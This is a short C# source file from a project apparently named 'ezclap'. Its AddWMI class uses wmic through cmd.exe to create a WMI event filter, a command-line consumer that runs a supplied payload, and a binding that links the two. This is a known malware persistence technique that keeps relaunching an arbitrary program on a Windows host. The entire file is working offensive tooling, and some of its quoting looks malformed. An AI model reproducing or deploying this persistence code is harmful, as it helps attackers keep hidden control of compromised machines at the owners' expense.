using System;
using System.Data;
using System.DirectoryServices;
using System.Collections.Generic;
using Microsoft.Win32;
using Microsoft.Win32.TaskScheduler;

namespace ezclap
{
    public class AddWMI
    {
		public AddWMI(string name, string payload)
        {
            Initialize(name, payload);
        }
		public static void Initialize(string name, string payload)
        {
            
            string arg1 = "wmic /NAMESPACE:\"\\\\root\\subscription\" PATH __EventFilter CREATE Name=\" " + name + "\", EventNameSpace=\"root\\cimv2\",QueryLanguage=\"WQL\", Query=\"SELECT* FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"";
            string arg2 = "wmic /NAMESPACE:\"\\\\root\\subscription\" PATH CommandLineEventConsumer CREATE Name=\"" + name + "\", ExecutablePath=\"" + payload + "\",CommandLineTemplate=\"" + payload + "\" ";
            string arg3 = "wmic /NAMESPACE:\"\\\\root\\subscription\" PATH __FilterToConsumerBinding CREATE Filter=\"__EventFilter.Name =\"" + name + "\", Consumer = \"CommandLineEventConsumer.Name=\"" + name + "\"";
            
            System.Diagnostics.Process.Start(@"C:\Windows\System32\cmd.exe", "/C " + arg1);
            System.Diagnostics.Process.Start(@"C:\Windows\System32\cmd.exe", "/C " + arg2);
            System.Diagnostics.Process.Start(@"C:\Windows\System32\cmd.exe", "/C " + arg3);
        }
    }
}
